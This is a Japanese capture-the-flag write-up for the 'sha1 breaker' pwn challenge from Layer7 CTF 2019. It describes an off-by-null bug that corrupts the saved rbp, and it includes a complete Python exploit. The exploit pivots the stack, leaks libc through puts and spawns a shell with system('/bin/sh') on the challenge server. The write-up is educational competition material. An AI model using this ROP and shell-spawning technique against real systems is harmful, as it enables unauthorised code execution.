# [pwn 1000pts] sha1 breaker - Layer7 CTF 2019
64ビットでPIEとSSPは無効です。
```
$ checksec -f sha1breaker
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No      0               5       sha1breaker
```
ランダムなバイト列のsha1を生成するか、それが特定のハッシュと衝突しているかのチェックしかできません。一見脆弱性はありませんが、sprintfでバッファを作っている際にカウンタが100以上だとoff-by-nullの脆弱性があります。off-by-nullによりsaved rbpを書き換えられるので、運が良ければreadintで書き込んだ最大0x20バイトのバッファにrspを移すことができます。
0x18バイトではシェルが取れないのですが、IDAでは表示されないreadline的な関数があるので、それを利用します。最初の`push rbp; mov rbp, rsp;`あたりを飛ばせば`leave; ret;`でrspを移せるので、2nd ROP chainに以降できます。
```python
from ptrlib import *
import os
import time

rop_pop_rdi = 0x00400ec3
rop_pop_rbp = 0x00400998
hidden_function = 0x400abd

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./sha1breaker")

os.system("sudo dmesg -C")
while True:
    #sock = Process("./sha1breaker")
    sock = Socket("bincat.kr", 30420)
    
    #for i in range(0x64):
    #    sock.sendafter(">> ", "1" + "\xff" * 0x1f)
    sock.send(("1" + "\xff" * 0x1f) * 0x64)
    for i in range(0x64):
        sock.recvuntil(">> ")
    payload  = p64(elf.section('.bss') + 0x410)
    payload += p64(rop_pop_rdi)
    payload += p64(elf.section('.bss') + 0x418)
    payload += p64(hidden_function)
    payload += p64(rop_pop_rdi)
    payload += p64(elf.got("puts"))
    payload += p64(elf.plt("puts"))
    payload += p64(rop_pop_rbp)
    payload += p64(elf.section('.bss') + 0x800)
    payload += p64(rop_pop_rdi)
    payload += p64(elf.section('.bss') + 0x808)
    payload += p64(hidden_function)
    sock.sendafter(">> ", payload)
    r = sock.recvline(timeout=1)
    if r is None or r == b'' or r == b'Menu':
        sock.close()
        continue
    if len(r) >= 20:
        sock.close()
        continue

    # libc leak
    libc_base = u64(r) - libc.symbol("puts")
    if libc_base >= 1 << 64:
        sock.close()
        continue
    logger.info("libc_base = " + hex(libc_base))
    
    # get the shell!
    payload  = p64(rop_pop_rdi + 1) # align rsp
    payload += p64(rop_pop_rdi)
    payload += p64(libc_base + next(libc.find("/bin/sh")))
    payload += p64(libc_base + libc.symbol("system"))
    sock.send(payload)
    
    sock.interactive()
    exit(0)
```

# 感想
良い感じのoff-by-null問ですね。
